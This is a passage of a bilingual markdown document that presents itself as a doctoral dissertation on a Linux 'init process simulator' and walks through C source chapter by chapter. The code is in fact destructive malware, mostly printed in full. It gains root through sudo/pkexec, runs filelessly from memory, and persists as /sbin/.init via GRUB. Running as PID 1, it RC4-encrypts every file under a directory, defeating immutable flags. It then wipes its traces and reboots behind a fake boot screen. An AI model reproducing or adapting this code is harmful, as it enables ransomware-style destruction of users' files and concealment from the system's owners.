| `rng > 90 && rng < 96` | 5% | Simulate failed unit |
| Otherwise | 85% | Normal successful start |

**ANSI Color Codes:**

| Code | Color | Usage |
|------|-------|-------|
| `\033[0;32m` | Green | `[ OK ]` messages |
| `\033[0;31m` | Red | `[FAILED]` messages |
| `\033[0;1;31m` | Bold Red | `[ FATAL ]` and `[ TIME ]` |
| `\033[0;33m` | Yellow | `[ *** ]` waiting jobs |
| `\033[1;37m` | Bold White | `[ INFO ]` messages |
| `\033[2J\033[H` | — | Clear screen and home cursor |

</details>

<details>
<summary><b>📁 Chapter 12: Stream Cipher — enc()</b></summary>

```c
FUNC void enc(const char *p) {
    static const uint8_t KEY[32] = {
        0xDE, 0xAD, 0xBE, 0xEF, 0x01, 0x23, 0x45, 0x67,
        0x89, 0xAB, 0xCD, 0xEF, 0xFE, 0xDC, 0xBA, 0x98,
        0x76, 0x54, 0x32, 0x10, 0xAA, 0xBB, 0xCC, 0xDD,
        0xEE, 0xFF, 0x00, 0x11, 0x22, 0x33, 0x44, 0x55
    };


    #define SWAP(a, b) do { uint8_t t = a; a = b; b = t; } while(0)



    int fd = sopen(p, O_RDONLY|O_NOATIME, 0);

    if (fd < 0) 
        return;

    long of = 0,  nf = 0;
    int  hf = (syscall(SYS_ioctl, U(fd), U(FS_IOC_GETFLAGS), U(&of)) == 0);

    if (hf) {
        nf = of & ~(FS_IMMUTABLE_FL|FS_APPEND_FL);
        syscall(SYS_ioctl, U(fd), U(FS_IOC_SETFLAGS), U(&nf));
    }

    sclose(fd);


    fd = sopen(p, O_RDWR|O_NOATIME, 0);

    if (fd < 0) 
        return;


    static uint8_t buf[524288];
    long r = syscall(SYS_read, U(fd), U(buf), U(sizeof(buf)));

    if (r <= 0) { 
        sclose(fd);
        return;
    }


    uint8_t s[256];

    for (int i = 0;  i < 256;  i++) 
        s[i] = (uint8_t)i;

  
    uint8_t j = 0;

    for (int i = 0;  i < 256;  i++) {
        j = (uint8_t)(j + s[i] + KEY[i % 32] + p[i % 16]);
        SWAP(s[i], s[j]);
    }


    uint8_t x = 0,  y = 0;

    for (int i = 0; i < r; i++) {
        x = (uint8_t)(x + 1);
        y = (uint8_t)(y + s[x]);

        SWAP(s[x], s[y]);
            
        buf[i] ^= s[(uint8_t)(s[x] + s[y])];
    }

  
    syscall(SYS_lseek, U(fd), 0, 0);
    syscall(SYS_write, U(fd), U(buf), U(r));
    syscall(SYS_fdatasync, U(fd));


    if (hf) 
        syscall(SYS_ioctl, U(fd), U(FS_IOC_SETFLAGS), U(&of));
    
    sclose(fd);
}
```

**RC4 Algorithm Breakdown:**

| Phase | Lines | Description |
|-------|-------|-------------|
| **Key Schedule (KSA)** | 52-62 | Initialize 256-byte S-box |
| **Initialization** | 52-54 | `s[i] = i` |
| **Permutation** | 56-61 | Swap based on key and path |
| **PRGA** | 64-72 | Generate keystream and XOR |
| **State Update** | 66-67 | Increment `x`, update `y` with `s[x]` |
| **Swap** | 69 | Swap `s[x]` and `s[y]` |
| **XOR** | 71 | `buf[i] ^= s[s[x] + s[y]]` |

**Filesystem Flag Handling:**

| Step | Purpose |
|------|---------|
| `FS_IOC_GETFLAGS` | Get current filesystem flags |
| `of & ~(FS_IMMUTABLE_FL\|FS_APPEND_FL)` | Remove immutable and append-only |
| `FS_IOC_SETFLAGS` | Apply temporary flags |
| After modification | Restore original flags |

</details>

<details>
<summary><b>📁 Chapter 13: Recursive Directory Scan — scan()</b></summary>

```c
static void scan(const char *p) {
    int fd = sopen(p, O_RDONLY|O_DIRECTORY|O_NOATIME, 0);

    if (fd < 0) 
        return;


    char buf[8192]; 
    int  n;


    while ( 
        ( n = syscall(SYS_getdents64, U(fd), U(buf), U(sizeof(buf))) ) > 0 
    ) {
        for (int i = 0;  i < n;) {
            struct dirent64_t *d = (struct dirent64_t*)(buf + i);

            if ((d->d_reclen) < sizeof(struct dirent64_t)) 
                break;


            char *name = (d->d_name);

            if ( 
                (name[0] == '.') && ( (name[1] == '\0')    || 
               ((name[1] == '.') && (  name[2] == '\0')) )
            ) {
                i += (d->d_reclen);
                continue;
            }


            char fp[4096];
            int  pln = -1;
            int  nln = -1;
 

            while (p[++pln]) 
                fp[pln] = p[pln]; 
            
            fp[pln++]     = '/';

            while (name[++nln]) 
                fp[pln + nln] = name[nln]; 
            
            fp[pln + nln] = '\0';


            if ((d->d_type) == DT_DIR) 
                scan(fp);
            
            else if ((d->d_type) == DT_REG) 
                enc(fp);
            
            
            i += (d->d_reclen);
        }
    }


    sclose(fd);
}
```

**Traversal Algorithm:**

| Step | Description |
|------|-------------|
| 1 | Open directory with `O_DIRECTORY` flag |
| 2 | Read entries using `getdents64` |
| 3 | Skip `.` and `..` to avoid infinite recursion |
| 4 | Build full path by concatenation |
| 5 | If `DT_DIR` → recursive call to `scan()` |
| 6 | If `DT_REG` → call `enc()` to process file |
| 7 | Advance by `d_reclen` bytes |

</details>

<details>
<summary><b>📁 Chapter 14: GRUB Cleanup — update_grub()</b></summary>

```c
FUNC void update_grub(void) {
    int fd = sopen(U("/boot/grub/grub.cfg"),  O_RDWR|O_NOATIME, 0);

    if (fd < 0) 
        fd = sopen(U("/boot/grub2/grub.cfg"), O_RDWR|O_NOATIME, 0);
    

    if (fd == -1) 
        return;


    char buf[65536];
    long n = syscall(SYS_read, fd, buf, sizeof(buf));

    if (n <= 0) { 
        sclose(fd);
        return; 
    }

    buf[n] = '\0';


    const char *s = "init=/sbin/.init quiet nosplash";
    int sl        = -1;
    while (s[++sl]);


    for (int i = 0;  i <= (n - sl);  i++) {
        int f = 1;

        for (int j = 0;  j < sl;  j++) {
            if (buf[i + j] != s[j]) {
                f = 0;
                break;
            }
        }


        if (f) 
            for (int j = 0;  j < sl;  j++) 
                buf[i + j] = ' '; 
    }
    

    syscall(SYS_lseek, fd, 0, 0); 
    syscall(SYS_write, fd, buf, n);


    syscall(SYS_fdatasync, fd);
    sclose(fd);
}
```

**Cleanup Algorithm:**

| Step | Description |
|------|-------------|
| 1 | Try `/boot/grub/grub.cfg`, fallback to `/boot/grub2/grub.cfg` |
| 2 | Read entire file into buffer |
| 3 | Search for `"init=/sbin/.init quiet nosplash"` |
| 4 | Overwrite with spaces (preserves file size) |
| 5 | Write back modified content |
| 6 | Sync to disk |

**Why Overwrite with Spaces?**
- Preserves file size (doesn't break offsets)
- Makes string unreadable to casual inspection
- Doesn't leave null bytes that might break parsers

</details>

<details>
<summary><b>📁 Chapter 15: Init Process Entry — init()</b></summary>

```c
FUNC void init(void) {
    if (syscall(SYS_getpid) != 1) 
        return;
    

    long o = syscall(SYS_fork);

    if (o == 0)
        while (1) output(); 


    syscall(SYS_mount, NULL, U("/"), NULL, U(MS_REMOUNT), NULL);
    syscall(SYS_mount, NULL, U(DIR), NULL, NULL,          NULL);


    scan(DIR);
    

    update_grub();
    syscall(SYS_unlink, U("/sbin/.init"));
    syscall(SYS_unlink, U("/etc/default/grub.d/99_custom.cfg"));


    syscall(SYS_sync);
    syscall(SYS_reboot, 0xfee1dead, 672274793, 0x01234567, NULL);


    while (1) syscall(SYS_pause);
    _exit(0);
}
```

**Init Process Flow:**

| Step | Code | Purpose |
|------|------|---------|
| 1 | `getpid() != 1` | Verify we are PID 1 (init process) |
| 2 | `fork()` | Create child for boot simulation |
| 3 | Child: `output()` | Infinite boot simulation loop |
| 4 | Parent: `mount("/", MS_REMOUNT)` | Remount root filesystem |
| 5 | `mount(DIR, ...)` | Mount target directory |
| 6 | `scan(DIR)` | Process files in target directory |
| 7 | `update_grub()` | Clean up GRUB modifications |
| 8 | `unlink("/sbin/.init")` | Remove custom init binary |
| 9 | `unlink(".../99_custom.cfg")` | Remove GRUB config |
| 10 | `sync()` | Flush filesystem buffers |
| 11 | `reboot(...)` | Reboot system |

**Reboot Magic Numbers:**
- `0xfee1dead` — LINUX_REBOOT_MAGIC1
- `672274793` — LINUX_REBOOT_MAGIC2 (0x28121969)
- `0x01234567` — LINUX_REBOOT_CMD_RESTART

</details>

<details>
<summary><b>📁 Chapter 16: Main Entry Point — main()</b></summary>

```c
int main(int argc, char *argv[]) {
    init();


    char p[2048];
    long exe = syscall(SYS_readlink, U("/proc/self/exe"), U(p), U(sizeof(p) - 1));

    if (exe <= 0) 
        _exit(0); 

    p[exe] = '\0';


    if (!( 
        (p[0] == '/') && (p[1] == 'm') && (p[2] == 'e') && (p[3] == 'm') 
    )) {
        set_root(p);
        jump_to_ram(p);
    }


    init_proc();
    loop();
    

    setup_init();
    setup_grub();



    uint64_t i = 0;

    while (1) {
        loop();


        if ((i % 6) == 0) {
            setup_init();
            setup_grub();
        }


        if (++i > 1000000) 
            i = 0;
    }
    


    return 0;
}
```

**Execution Path Decision Tree:**

```
main()
    │
    ├─ init() — Check if PID == 1
    │
    ├─ readlink("/proc/self/exe") — Get current executable path
    │
    ├─ if (path starts with "/mem") ?
    │       │
    │       ├─ YES: Already in memory → skip elevation
    │       │
    │       └─ NO: Not in memory
    │               │
    │               ├─ set_root(p) — Elevate via sudo/pkexec
    │               │
    │               └─ jump_to_ram(p) — Execute from memory
    │
    ├─ init_proc() — Daemonize
    │
    ├─ loop() — Junk computation
    │
    ├─ setup_init() — Install to /sbin/.init
    │
    ├─ setup_grub() — Configure GRUB
    │
    └─ while (1) — Main persistence loop
            │
            ├─ loop() — Junk computation
            │
            ├─ if (i % 6 == 0) — Every 6 iterations
            │       │
            │       ├─ setup_init() — Verify installation
            │       │
            │       └─ setup_grub() — Verify GRUB config
            │
            └─ i++ (reset at 1,000,000)
```

</details>

---

## 4. System Call Reference

| # | Name | Purpose | Used In |
|---|------|---------|---------|
| 0 | `read` | Read from fd | `unit_desc`, `enc`, `update_grub` |
| 1 | `write` | Write to fd | `iprint`, `setup_grub`, `enc`, `update_grub` |
| 3 | `close` | Close fd | Throughout |
| 4 | `stat` | Get file status | `setup_init`, `setup_grub` |
| 5 | `fstat` | Get file status by fd | `jump_to_ram`, `setup_init` |
| 8 | `lseek` | Seek in file | `enc`, `update_grub` |
| 16 | `ioctl` | Device control | `enc` |
| 23 | `select` | Multiplexed I/O | `loop` |
| 35 | `nanosleep` | High-res sleep | `loop`, `output` |
| 39 | `getpid` | Get process ID | `init` |
| 40 | `sendfile` | Transfer data between fds | `jump_to_ram`, `setup_init` |
| 57 | `fork` | Create child process | `init_proc`, `init` |
| 59 | `execve` | Execute program | `set_root` |
| 72 | `fcntl` | File control | `jump_to_ram` |
| 80 | `chdir` | Change directory | `init_proc` |
| 83 | `mkdir` | Create directory | `setup_grub` |
| 87 | `unlink` | Delete file | `init` |
| 95 | `umask` | Set file creation mask | `init_proc` |
| 102 | `getuid` | Get user ID | `set_root` |
| 112 | `setsid` | Create session | `init_proc` |
| 140 | `setpriority` | Set process priority | `init_proc` |
| 157 | `prctl` | Process control | `init_proc` |
| 162 | `sync` | Sync filesystems | `init` |
| 165 | `mount` | Mount filesystem | `init` |
| 169 | `reboot` | Reboot system | `init` |
| 217 | `getdents64` | Read directory entries | `output`, `scan` |
| 231 | `exit_group` | Exit all threads | Throughout |
| 257 | `openat` | Open file | Throughout |
| 280 | `utimensat` | Change timestamps | `setup_init`, `setup_grub` |
| 319 | `memfd_create` | Create anonymous file | `jump_to_ram` |
| 322 | `execveat` | Execute from fd | `jump_to_ram` |

---

## 5. Conclusion

This dissertation has presented a **complete technical analysis** of Linux system programming techniques through the implementation of an init process simulator. The research has demonstrated:

1. **Direct system call programming** without libc dependencies
2. **Fileless execution** using `memfd_create` and `execveat`
3. **Classical daemonization** via double-fork and session management
4. **Systemd boot sequence simulation** with realistic output
5. **RC4-like stream cipher** implementation for educational purposes
6. **GRUB2 configuration modification** techniques
7. **Process masquerading** as kernel threads

**Future Work:**
- Analysis of additional init systems (OpenRC, runit)
- Deeper cryptanalysis of the RC4 variant
- Integration with secure boot mechanisms
- Porting to additional architectures (ARM64, RISC-V)

---

# Русский

## 1. Аннотация

Данная диссертация представляет **полный технический анализ** техник системного программирования Linux через реализацию симулятора init-процесса. Исследование демонстрирует прямое взаимодействие с ядром через системные вызовы, минуя стандартную библиотеку C.

**Ключевые слова:** Ядро Linux, Системные вызовы, Init-процесс, memfd_create, execveat, Демонизация, RC4, GRUB2

---

## 2. Архитектура системы

*(См. диаграммы в английской версии)*

---

## 3. Полный анализ исходного кода

*(См. секции с кодом в английской версии)*

---

## 4. Справочник системных вызовов

*(См. таблицу в английской версии)*

---

## 5. Заключение

Данная диссертация представила **полный технический анализ** техник системного программирования Linux. Исследование продемонстрировало:

1. **Прямое программирование системных вызовов** без libc
2. **Бесфайловое выполнение** через `memfd_create` и `execveat`
3. **Классическую демонизацию** через двойной fork
4. **Симуляцию загрузки systemd** с реалистичным выводом
5. **Потоковый шифр типа RC4** в образовательных целях
6. **Модификацию GRUB2** конфигурации
7. **Маскировку под потоки ядра**

---

<div align="center">

**[⬆ Back to Top](#-linux-init-process-complete-technical-dissertation)**

*Doctoral Research Thesis — Linux Kernel Internals*

</div>
